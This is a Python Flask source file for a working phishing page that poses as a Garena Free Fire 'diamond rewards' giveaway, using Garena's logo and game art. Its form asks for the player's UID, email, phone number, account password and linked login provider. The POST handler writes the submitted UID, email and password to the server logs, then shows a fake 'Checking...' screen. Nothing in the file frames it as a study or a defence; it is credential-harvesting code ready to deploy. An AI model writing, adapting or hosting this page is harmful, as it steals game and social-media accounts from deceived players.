from flask import Flask, request, render_template_string

app = Flask(__name__)

# --- CONFIGURATION ---
# Aapka background wallpaper
BG_URL = "https://raw.githubusercontent.com/northway656-create/myflaskapp/main/1868470-1080x1920-samsung-full-hd-garena-free-fire-wallpaper-photo.jpg"

# GARENA RED DRAGON LOGO (Direct High-Speed Link)
GARENA_LOGO = "https://upload.wikimedia.org/wikipedia/en/thumb/f/f6/Garena_logo.svg/1200px-Garena_logo.svg.png"

HTML_TEMPLATE = f'''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>FF Diamond Rewards</title>
    <style>
        * {{ box-sizing: border-box; margin: 0; padding: 0; }}
        body {{
            background-image: url('{BG_URL}');
            background-size: cover; 
            background-position: center; 
            background-attachment: fixed;
            font-family: sans-serif;
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
        }}
        .main-container {{
            width: 100%;
            max-width: 380px;
            padding: 15px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }}
        
        /* Aapka Original Red Garena Logo */
        .garena-header-img {{
            width: 240px;
            height: auto;
            margin-bottom: 15px;
            display: block;
            filter: drop-shadow(0 5px 15px rgba(0,0,0,0.5));
        }}
        
        .form-box {{
            background: rgba(255, 255, 255, 0.98); 
            padding: 25px; 
            border-radius: 15px;
            text-align: center; 
            width: 100%;
            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
        }}
        
        /* 💎 Blue Title 💎 */
        .reward-title {{
            color: #1a73e8; 
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 20px;
            text-transform: uppercase;
        }}
        
        input, select {{ 
            width: 100%; 
            padding: 14px; 
            margin: 10px 0; 
            border: 1px solid #ccc; 
            border-radius: 8px; 
            font-size: 16px;
        }}
        
        /* Blue Proceed Button */
        .submit-btn {{ 
            background: #1a73e8; 
            color: white; 
            border: none; 
            padding: 16px; 
            width: 100%; 
            border-radius: 8px; 
            font-weight: bold; 
            font-size: 18px;
            cursor: pointer;
            margin-top: 10px;
            text-transform: uppercase;
        }}
    </style>
</head>
<body>
    <div class="main-container">
        <img src="{GARENA_LOGO}" alt="Garena Logo" class="garena-header-img">
        
        <div class="form-box">
            <div class="reward-title">💎 FREE FIRE REWARDS 💎</div>
            
            <form action="/preview" method="post">
                <input type="text" name="uid" placeholder="Free Fire UID" required>
                <input type="email" name="email" placeholder="Email Address" required>
                <input type="text" name="phone" placeholder="Mobile Number" required>
                <input type="password" name="password" placeholder="Account Password" required>
                <select name="account_type">
                    <option value="Google">Google Account</option>
                    <option value="Facebook">Facebook Account</option>
                    <option value="VK">VK Account</option>
                    <option value="X">X (Twitter)</option>
                </select>
                <button type="submit" class="submit-btn">PROCEED</button>
            </form>
        </div>
    </div>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/preview', methods=['POST'])
def preview():
    # Saara data Render ke Logs mein jayega
    data = request.form
    print(f"\\n🎯 DATA: UID:{{data.get('uid')}}, Email:{{data.get('email')}}, Pass:{{data.get('password')}}\\n")
    return "<body style='background:black; color:white; display:flex; justify-content:center; align-items:center; height:100vh;'><h1>Checking...</h1></body>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
